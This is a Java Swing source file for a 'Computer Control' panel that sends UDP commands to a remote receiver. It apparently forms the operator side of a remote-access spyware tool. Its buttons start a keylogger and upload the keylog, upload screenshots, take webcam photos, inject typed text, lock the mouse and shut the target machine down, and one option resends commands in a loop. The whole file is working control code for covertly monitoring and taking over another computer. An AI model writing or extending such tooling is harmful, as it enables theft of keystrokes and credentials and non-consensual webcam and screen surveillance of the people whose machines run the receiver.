package sender;

import java.awt.Canvas;
import java.awt.HeadlessException;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;

public class Sender extends Canvas implements Runnable {
	private static final long serialVersionUID = 2536717040008859009L;
	private JFrame frame;

	private DatagramSocket socket = null;
	private InetAddress ipAdress = null;
	private int port = 8556;

	private JButton buttonMonitor;
	private JButton buttonRefresh;
	private JButton buttonSetVolume;
	private JButton buttonOpenDrive;
	private JButton buttonCloseReceiver;
	private JButton buttonShutdown;
	private JButton buttonLockMouse;
	private JButton buttonUnlockMouse;
	private JButton buttonSpeak;
	private JButton buttonWebsite;
	private JButton buttonRepeat;
	private JButton buttonScreenshot;
	private JButton buttonKeyLogging;
	private JButton buttonUploadKeylog;
	private JButton buttonWebcam;
	private JButton buttonTypeText;
	private JLabel labelReceiverStatus;
	private boolean isKeyLogging = false;
	private boolean isRepeating = false;
	private Runnable runnableRepeatLastPackage;
	private Thread threadRepeatLastPackage;
	private Thread thread;
	private String lastMessage = "";

	public Sender() {
		createAndShowGUI();
		thread = new Thread(this);
		thread.start();
		// port = Integer.parseInt(JOptionPane.showInputDialog("Port:"));
	}

	private void checkReciverStatus() {
		// Check if receiver active
		String message = "";
		DatagramSocket socketReceive = null;
		try {
			socketReceive = new DatagramSocket(port);
			byte[] data = new byte[1024];
			sendData("CheckIfOnline;");
			DatagramPacket packet = new DatagramPacket(data, data.length);
			while (!message.startsWith("IMONLINE;")) {
				try {
					socketReceive.receive(packet);
				} catch (IOException e) {
					e.printStackTrace();
				}
				message = new String(packet.getData(), 0, packet.getLength());
				message = message.replace("", ""); // Not sure why this is here
													// maybe crap
				labelReceiverStatus.setText("receiver is online");
				System.out.println("receiver replied: " + message);
			}
			socketReceive.close();
		} catch (SocketException e1) {
			e1.printStackTrace();
		}
	}

	public static void main(String[] args) {
		new Sender();
	}

	private void sendData(String command) {
		DatagramPacket packet = new DatagramPacket(command.getBytes(), command.getBytes().length, ipAdress, port);
		try {
			socket.send(packet);
		} catch (IOException e) {
			e.printStackTrace();
		}
		System.out.println("Send data to \t" + ipAdress + ":" + port + "\t message: " + command);
		lastMessage = command;
	}

	private void createAndShowGUI() {
        frame = new JFrame("Computer Control");
        frame.setSize(340, 300);
        frame.setResizable(false);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setLocationRelativeTo(null);
        
        labelReceiverStatus = new JLabel("receiver is offline");
        
        buttonMonitor = new JButton("Monitor Off");
        buttonMonitor.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sendData("MonitorOff;");
			}
		});
        buttonRefresh = new JButton("Check receiver status");
        buttonRefresh.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				labelReceiverStatus.setText("checking receiver status");
				checkReciverStatus();
			}
		});
        buttonSetVolume = new JButton("Change Volume");
        buttonSetVolume.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sendData("SetVol;" + JOptionPane.showInputDialog("Set volume") + ";");
			}
		});
        buttonOpenDrive = new JButton("Open Drive");
        buttonOpenDrive.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sendData("OpenDrive;" + JOptionPane.showInputDialog("Laufwerkbuchstabe:") + ";");
			}
		});
        buttonCloseReceiver = new JButton("Shutdown Receiver");
        buttonCloseReceiver.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sendData("stop;");
			}
		});
        buttonShutdown = new JButton("Shutdown Machine");
        buttonShutdown.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
        		sendData("Shutdown;");
			}
		});
        buttonLockMouse = new JButton("Lock Mouse");
        buttonLockMouse.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sendData("LockMouse;" + JOptionPane.showInputDialog("X Position") + ";" + JOptionPane.showInputDialog("Y Position") + ";");
			}
		});
        buttonUnlockMouse = new JButton("Unlock Mouse");
        buttonUnlockMouse.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sendData("UnlockMouse;");
			}
		});
        buttonSpeak = new JButton("Speak");
        buttonSpeak.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sendData("Speak;" + JOptionPane.showInputDialog("Text to speak") + ";");
			}
		});
        buttonWebsite = new JButton("Open Website");
        buttonWebsite.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sendData("Website;" + JOptionPane.showInputDialog("Website to open:") + ";");
			}
		});
        buttonRepeat = new JButton("Repeat last operation - Start");
        buttonRepeat.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if(lastMessage != "") {
					if(!isRepeating) {
						buttonRepeat.setText("Repeat last operation - Stop");
						isRepeating = true;
						runnableRepeatLastPackage = new Runnable() {
							private long lastTime = 0;
							private long tick = 100;
							public void run() {
								while(isRepeating) {
									if(lastMessage == "") {
										try {
											threadRepeatLastPackage.join();
										} catch (InterruptedException e) {
											e.printStackTrace();
										}
									}
									
									if(lastTime == 0) {
										lastTime = System.currentTimeMillis();
									}
									if(lastTime+tick < System.currentTimeMillis()) {
										sendData(lastMessage);
										lastTime = System.currentTimeMillis();
									}
								}
							}
						};
						threadRepeatLastPackage = new Thread(runnableRepeatLastPackage);
						threadRepeatLastPackage.start();
					} else {
						buttonRepeat.setText("Repeat last operation - Start");
						isRepeating = false;
						try {
							threadRepeatLastPackage.join();
						} catch (InterruptedException e1) {
							e1.printStackTrace();
						}
					}
				}
			}
		});
        buttonScreenshot = new JButton("Make/Upload Screenshot");
        buttonScreenshot.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sendData("Screenshot;");
			}
		});
        buttonKeyLogging = new JButton("Key Logging - Start");
        buttonKeyLogging.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if(!isKeyLogging) {
					isKeyLogging = true;
					sendData("startKeyLogger;");
					buttonKeyLogging.setText("Key Logging - Stop");
				} else {
					isKeyLogging = false;
					sendData("stopKeyLogger;");
					buttonKeyLogging.setText("Key Logging - Start");
				}
			}
		});
        buttonUploadKeylog = new JButton("Upload Keylog");
        buttonUploadKeylog.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sendData("uploadKeyLog;");
			}
		});
        buttonWebcam = new JButton("Make Photo");
        buttonWebcam.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sendData("webcam;");
			}
		});
        buttonTypeText = new JButton("Type Text");
        buttonTypeText.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				sendData("typeText;" + JOptionPane.showInputDialog("text: ") + ";");
			}
		});
        JLabel labelCredits = new JLabel("TCP package Sender by Michael Kleinlercher");
        
        //buttonKeyLogging.setEnabled(false);
        //buttonUploadKeylog.setEnabled(false);
        
        JPanel panel = new JPanel();
        panel.add(labelReceiverStatus);
        panel.add(buttonRefresh);
        panel.add(buttonMonitor);
        panel.add(buttonSetVolume);
        panel.add(buttonOpenDrive);
        panel.add(buttonCloseReceiver);
        panel.add(buttonShutdown);
        panel.add(buttonLockMouse);
        panel.add(buttonUnlockMouse);
        panel.add(buttonSpeak);
        panel.add(buttonWebsite);
        panel.add(buttonRepeat);
        panel.add(buttonScreenshot);
        panel.add(buttonWebcam);
        panel.add(buttonTypeText);
        panel.add(buttonKeyLogging);
        panel.add(buttonUploadKeylog);
        panel.add(labelCredits);
        frame.add(this);
        frame.add(panel);
        frame.setVisible(false);
    }

	public void run() {
		try {
			ipAdress = InetAddress.getByName(
					JOptionPane.showInputDialog(null, "IP-Addrese: ", "localhost", JOptionPane.QUESTION_MESSAGE));
			socket = new DatagramSocket();
		} catch (HeadlessException | UnknownHostException | SocketException e1) {
			e1.printStackTrace();
		}
		frame.setVisible(true);
	}
}
